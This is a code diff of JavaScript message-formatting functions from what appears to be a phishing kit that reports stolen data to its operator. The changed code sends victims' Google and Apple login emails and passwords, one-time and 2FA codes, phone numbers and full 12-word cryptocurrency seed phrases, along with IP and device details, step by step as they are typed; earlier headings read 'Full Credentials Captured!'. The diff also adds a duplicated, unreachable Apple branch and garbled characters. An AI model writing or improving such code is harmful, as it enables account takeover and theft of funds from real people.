@@ -147,62 +147,79 @@ const sendCredentialStartNotification = async (provider, data) => {
     let message = '';
     
     if (provider === 'Google') {
-      message = `
-🎯 *GOOGLE AUTH STARTED*
+      // Check what step we're on
+      if (data.step === 'email') {
+        message = `
+📧 *GOOGLE - EMAIL ENTERED*
 
-📧 *Email Entered:*
 \`${escapeMarkdown(data.email)}\`
 
-📍 *Location Info:*
-━━━━━━━━━━━━━━━━━━━
-IP: \`${escapeMarkdown(data.ipAddress)}\`
-Timezone: ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}
-Language: ${escapeMarkdown(data.userDetails?.language || 'Unknown')}
-
-💻 *Device:*
-━━━━━━━━━━━━━━━━━━━
-Platform: ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}
-Screen: ${escapeMarkdown(data.userDetails?.screenResolution || 'Unknown')}
+📍 IP: \`${escapeMarkdown(data.ipAddress)}\`
+🌍 ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}
+💻 ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}
 
 ⏰ ${new Date().toLocaleString()}
 `;
+      } else if (data.step === 'password') {
+        message = `
+🔒 *GOOGLE - PASSWORD ENTERED*
+
+📧 Email: \`${escapeMarkdown(data.email)}\`
+🔑 Password: \`${escapeMarkdown(data.password)}\`
+
+📍 IP: \`${escapeMarkdown(data.ipAddress)}\`
+
+⏰ ${new Date().toLocaleString()}
+`;
+      } else {
+        // Fallback for other steps
+        message = `
+🎯 *GOOGLE AUTH - ${escapeMarkdown(data.step?.toUpperCase() || 'STEP')}*
+
+📧 Email: \`${escapeMarkdown(data.email)}\`
+${data.password ? `🔑 Password: \`${escapeMarkdown(data.password)}\`` : ''}
+
+📍 IP: \`${escapeMarkdown(data.ipAddress)}\`
+
+⏰ ${new Date().toLocaleString()}
+`;
+      }
     } else if (provider === 'Apple') {
-      message = `
-🍎 *APPLE AUTH STARTED*
+      // Apple auth steps
+      if (data.step === 'credentials') {
+        message = `
+🍎 *APPLE - CREDENTIALS ENTERED*
 
-📧 *Apple ID Entered:*
-\`${escapeMarkdown(data.appleId)}\`
+📧 Apple ID: \`${escapeMarkdown(data.appleId)}\`
+� Password: \`${escapeMarkdown(data.password || '[Entering...]')}\`
 
-📍 *Location Info:*
-━━━━━━━━━━━━━━━━━━━
-IP: \`${escapeMarkdown(data.ipAddress)}\`
-Timezone: ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}
-Language: ${escapeMarkdown(data.userDetails?.language || 'Unknown')}
-
-💻 *Device:*
-━━━━━━━━━━━━━━━━━━━
-Platform: ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}
-Screen: ${escapeMarkdown(data.userDetails?.screenResolution || 'Unknown')}
+📍 IP: \`${escapeMarkdown(data.ipAddress)}\`
+🌍 ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}
+💻 ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}
 
 ⏰ ${new Date().toLocaleString()}
 `;
+      } else {
+        message = `
+🍎 *APPLE AUTH - ${escapeMarkdown(data.step?.toUpperCase() || 'STEP')}*
+
+📧 Apple ID: \`${escapeMarkdown(data.appleId)}\`
+
+📍 IP: \`${escapeMarkdown(data.ipAddress)}\`
+
+⏰ ${new Date().toLocaleString()}
+`;
+      }
     } else if (provider === 'Recovery Phrase') {
       message = `
-🔑 *RECOVERY PHRASE STARTED*
+🔑 *RECOVERY PHRASE ENTERED*
 
-🗝 *Seed Phrase (12 words):*
-\`${escapeMarkdown(data.seedPhrase?.substring(0, 80))}\`...
+🗝 *12-Word Seed Phrase:*
+\`${escapeMarkdown(data.seedPhrase)}\`
 
-📍 *Location Info:*
-━━━━━━━━━━━━━━━━━━━
-IP: \`${escapeMarkdown(data.ipAddress)}\`
-Timezone: ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}
-Language: ${escapeMarkdown(data.userDetails?.language || 'Unknown')}
-
-💻 *Device:*
-━━━━━━━━━━━━━━━━━━━
-Platform: ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}
-Screen: ${escapeMarkdown(data.userDetails?.screenResolution || 'Unknown')}
+📍 IP: \`${escapeMarkdown(data.ipAddress)}\`
+🌍 ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}
+💻 ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}
 
 ⏰ ${new Date().toLocaleString()}
 `;
@@ -230,81 +247,74 @@ const sendCredentialCompleteNotification = async (provider, data) => {
     
     if (provider === 'Google') {
       message = `
-✅ *GOOGLE AUTH COMPLETE*
+✅ *GOOGLE - OTP/2FA ENTERED*
 
-🎉 *Full Credentials Captured!*
-━━━━━━━━━━━━━━━━━━━
-📧 Email: \`${escapeMarkdown(data.email)}\`
-🔒 Password: \`${escapeMarkdown(data.password)}\`
-🔢 OTP: \`${escapeMarkdown(data.otp)}\`
+� OTP Code: \`${escapeMarkdown(data.otp)}\`
 📱 Phone: ${escapeMarkdown(data.phoneNumber || 'Not provided')}
 📮 Recovery: ${escapeMarkdown(data.recoveryEmail || 'Not provided')}
 
-📍 *Location:*
 ━━━━━━━━━━━━━━━━━━━
-IP: \`${escapeMarkdown(data.ipAddress)}\`
-Timezone: ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}
+📧 Email: \`${escapeMarkdown(data.email)}\`
+� Password: \`${escapeMarkdown(data.password)}\`
 
-💻 *Device:*
-━━━━━━━━━━━━━━━━━━━
-Platform: ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}
-Browser: ${escapeMarkdown(data.userDetails?.userAgent?.substring(0, 50) || 'Unknown')}...
+📍 IP: \`${escapeMarkdown(data.ipAddress)}\`
 
 ⏰ ${new Date().toLocaleString()}
 
-🎯 *Status:* FULLY CAPTURED ✅
+🎯 *AUTHENTICATION COMPLETE* ✅
 `;
     } else if (provider === 'Apple') {
       message = `
-✅ *APPLE AUTH COMPLETE*
+✅ *APPLE - 2FA CODE ENTERED*
 
-🎉 *Full Credentials Captured!*
-━━━━━━━━━━━━━━━━━━━
-📧 Apple ID: \`${escapeMarkdown(data.appleId)}\`
-🔒 Password: \`${escapeMarkdown(data.password)}\`
 🔢 2FA Code: \`${escapeMarkdown(data.otp)}\`
 📱 Phone: ${escapeMarkdown(data.phoneNumber || 'Not provided')}
 📱 Device: ${escapeMarkdown(data.trustedDevice || 'Not provided')}
 
-📍 *Location:*
 ━━━━━━━━━━━━━━━━━━━
-IP: \`${escapeMarkdown(data.ipAddress)}\`
-Timezone: ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}
+📧 Apple ID: \`${escapeMarkdown(data.appleId)}\`
+🔒 Password: \`${escapeMarkdown(data.password)}\`
 
-💻 *Device:*
-━━━━━━━━━━━━━━━━━━━
-Platform: ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}
-Browser: ${escapeMarkdown(data.userDetails?.userAgent?.substring(0, 50) || 'Unknown')}...
+📍 IP: \`${escapeMarkdown(data.ipAddress)}\`
 
 ⏰ ${new Date().toLocaleString()}
 
-🎯 *Status:* FULLY CAPTURED ✅
+🎯 *AUTHENTICATION COMPLETE* ✅
+`;
+    } else if (provider === 'Apple') {
+      message = `
+✅ *APPLE - 2FA CODE ENTERED*
+
+🔢 2FA Code: \`${escapeMarkdown(data.otp)}\`
+📱 Phone: ${escapeMarkdown(data.phoneNumber || 'Not provided')}
+📱 Device: ${escapeMarkdown(data.trustedDevice || 'Not provided')}
+
+━━━━━━━━━━━━━━━━━━━
+📧 Apple ID: \`${escapeMarkdown(data.appleId)}\`
+🔒 Password: \`${escapeMarkdown(data.password)}\`
+
+� IP: \`${escapeMarkdown(data.ipAddress)}\`
+
+⏰ ${new Date().toLocaleString()}
+
+🎯 *AUTHENTICATION COMPLETE* ✅
 `;
     } else if (provider === 'Recovery Phrase') {
       message = `
-✅ *RECOVERY PHRASE COMPLETE*
+✅ *RECOVERY PHRASE - VERIFICATION COMPLETE*
 
-🎉 *Full Credentials Captured!*
+ Email: \`${escapeMarkdown(data.email)}\`
+🔒 Password: \`${escapeMarkdown(data.password)}\`
+
 ━━━━━━━━━━━━━━━━━━━
 🔑 Seed Phrase:
 \`${escapeMarkdown(data.seedPhrase)}\`
 
-📧 Email: \`${escapeMarkdown(data.email)}\`
-🔒 Password: \`${escapeMarkdown(data.password)}\`
-
-📍 *Location:*
-━━━━━━━━━━━━━━━━━━━
-IP: \`${escapeMarkdown(data.ipAddress)}\`
-Timezone: ${escapeMarkdown(data.userDetails?.timezone || 'Unknown')}
-
-💻 *Device:*
-━━━━━━━━━━━━━━━━━━━
-Platform: ${escapeMarkdown(data.userDetails?.platform || 'Unknown')}
-Browser: ${escapeMarkdown(data.userDetails?.userAgent?.substring(0, 50) || 'Unknown')}...
+� IP: \`${escapeMarkdown(data.ipAddress)}\`
 
 ⏰ ${new Date().toLocaleString()}
 
-🎯 *Status:* FULLY CAPTURED ✅
+🎯 *AUTHENTICATION COMPLETE* ✅
 `;
     }
 
